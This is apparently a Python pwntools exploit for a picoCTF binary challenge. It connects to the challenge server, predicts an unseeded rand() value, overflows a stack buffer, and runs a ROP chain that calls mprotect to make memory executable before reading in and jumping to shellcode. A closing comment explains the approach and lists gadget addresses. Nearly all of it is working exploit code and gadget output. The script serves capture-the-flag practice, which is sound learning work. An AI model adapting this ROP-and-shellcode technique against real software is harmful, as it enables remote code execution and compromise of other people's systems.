from pwn import *
import struct

www = p64(0x48dd71)
pop_rax = p64(0x4163f4)
pop_rdi = p64(0x400696)
pop_rsi = p64(0x410ca3)
pop_rdx = p64(0x44a6b5)
pop_rbx = p64(0x400ed8)
pop_rbx_rbp = p64(0x401ce6)
pop_r12_r13 = p64(0x40dbe9)
pop_rdx_r10 = p64(0x44cc24)
pop_r14_r15 = p64(0x400693)
mov_rbx_pop_rbx = p64(0x489058)
pop_rax_rdx_rbx = p64(0x482776)

## registers that remain constant through runs of win
### rbx, r12, r13, r14, r15

f = open('shellcode', 'rb')
shellcode = f.read()
f.close()

p = remote('jupiter.challenges.picoctf.org', 38467)
#p = process('./vuln')

e = ELF('./vuln')

## Read until the prompt
p.readuntil('?\n')

## Since the rand isn't seeded it will be constant
p.send('84\n')

p.readuntil('? ')

### Call mprotect(0x06ba000, 4096, 7) to make some executable memory. Then ready again for the read
data = b'a'*0x78
data += pop_rdi
data += p64(0x06ba000)	## start of the got. I want the data section but need to page align
data += pop_rsi
data += p64(4096)	## a full page
data += pop_rdx
data += p64(7)	## rwx
data += p64(e.symbols['mprotect'])
data += p64(e.symbols['win'])

write_loc = 0x6ba8f0

p.send(data + b'\n')

p.readuntil('? ')

### call read(stdin, 0x5ba8f0, len(shellcode))
data = b'a'*0x78
data += pop_rdi
data += p64(0)				## fd of stdin
data += pop_rsi
data += p64(write_loc)		## where to write
data += pop_rdx
data += p64(len(shellcode))	## length
data += p64(e.symbols['read'])
data += p64(write_loc)		## Return to the shellcode

p.send(data + b'\n\n')
p.send(shellcode)			## for the read() call

p.interactive()

'''

the random number generation/guessing is useless since without a seed rand() returns a constant value.

Then you just have to overflow the return address to begin ropping. The binary is statically compiled.

In the win() function there is only one stack variable which is the vulnerable buffer. we get to read in 360 bytes which
doesn't give a ton of room for gadgets but still plenty.

There are probably a few special gadgets that will make it easy but I just decided to construct a rop chain
that will set the data section in the binary to executable, write code there then execute it.


Gadgets:

Write what where gadgets
0x000000000048b9c3 : mov qword ptr [r10], r8 ; ret

0x000000000048dd71 : mov qword ptr [rax], rdx ; ret

## Register control

0x00000000004163f4 : pop rax ; ret

0x000000000044a6b5 : pop rdx ; ret

Place to write:

0x6ba8f0
0x000000000044a6b5 : pop rdx ; ret
0x0000000000400696 : pop rdi ; ret
0x000000000044cc25 : pop r10 ; ret
0x00000000004026ee : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000040068f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000410259 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000410c9e : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040dbe9 : pop r12 ; pop r13 ; ret
0x0000000000405ef4 : pop r12 ; ret
0x000000000044cc24 : pop rdx ; pop r10 ; ret
0x0000000000489058 : mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x0000000000410ca3 : pop rsi ; ret
0x0000000000400696 : pop rdi ; ret
0x000000000044a6b5 : pop rdx ; ret
0x000000000044cc25 : pop r10 ; ret
0x0000000000400ed8 : pop rbx ; ret
0x0000000000401ce6 : pop rbx ; pop rbp ; ret
0x0000000000400693 : pop r14 ; pop r15 ; ret
0044a6a0  read
0x0000000000482776 : pop rax ; pop rdx ; pop rbx ; ret

.got_plt 0x06ba000
'''

'''


'''
